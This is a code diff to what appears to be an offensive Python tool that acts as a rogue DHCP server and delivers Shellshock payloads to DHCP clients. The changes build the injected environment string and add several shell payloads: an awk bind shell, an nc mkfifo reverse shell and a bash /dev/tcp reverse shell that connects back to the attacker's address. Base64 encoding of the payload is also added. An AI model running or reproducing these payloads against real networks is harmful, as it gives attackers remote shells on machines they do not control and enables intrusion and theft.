@@ -21,8 +21,15 @@ parser.add_argument('-l', '--last_offer_ip', type=str, required=True, help='Set 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
 parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
 parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)', default=1234)
-parser.add_argument('-r', '--reverse_shell', action='store_true', help='Use nc reverse tcp shell in DHCP client')
+parser.add_argument('-N', '--nc_reverse_shell', action='store_true', help='Use nc reverse tcp shell in DHCP client')
+parser.add_argument('-R', '--bash_reverse_shell', action='store_true', help='Use bash reverse tcp shell in DHCP client')
 parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
+parser.add_argument('-n', '--config_network', type=int, help='0 - do not add network configure in payload, '
+                                                             '1 - add network configure in payload, '
+                                                             'default=1', default=1)
+parser.add_argument('-B', '--base64_encode', type=int, help='0 - do not use base64 encode in payload, '
+                                                            '1 - use base64 encode in payload, '
+                                                            'default=1', default=1)
 
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
@@ -52,6 +59,7 @@ number_of_dhcp_request = 0
 shellshock_url = None
 proxy = None
 domain = None
+payload = None
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
@@ -256,26 +264,37 @@ def dhcp_reply(request):
 
             else:
                 net_settings = "/bin/ip addr add " + requested_ip + \
-                               "/" + network_mask + " dev eth0;"
+                                "/" + network_mask + " dev eth0;"
+
+                global payload
 
                 if args.shellshock_command is not None:
-                    b64command = b64encode(net_settings + args.shellshock_command)
-                    shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64command + ")"
-                    if len(shellshock_url) > 255:
-                        print "[ERROR] Len of command is very big!"
-                        shellshock_url = "A"
+                    payload = args.shellshock_command
 
                 if args.bind_shell:
-                    bind_shell = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
-                                 "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
-                    b64shell = b64encode(net_settings + bind_shell)
-                    shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
+                    payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
+                              "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
 
-                if args.reverse_shell:
-                    reverse_shell = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-                                    your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
-                    b64shell = b64encode(net_settings + reverse_shell)
-                    shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
+                if args.nc_reverse_shell:
+                    payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
+                              your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+
+                if args.bash_reverse_shell:
+                    payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
+                              "/" + str(args.reverse_port) + " 0>&1"
+
+                if payload is not None:
+                    if args.config_network == 1:
+                        payload = net_settings + payload
+                    if args.base64_encode == 1:
+                        payload = b64encode(payload)
+                        shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
+                    else:
+                        shellshock_url = "() { :" + "; }; " + payload
+
+                if len(shellshock_url) > 255:
+                    print "[ERROR] Len of command is very big! Current len: " + str(len(shellshock_url))
+                    shellshock_url = "A"
 
                 global proxy
                 if args.proxy is None:
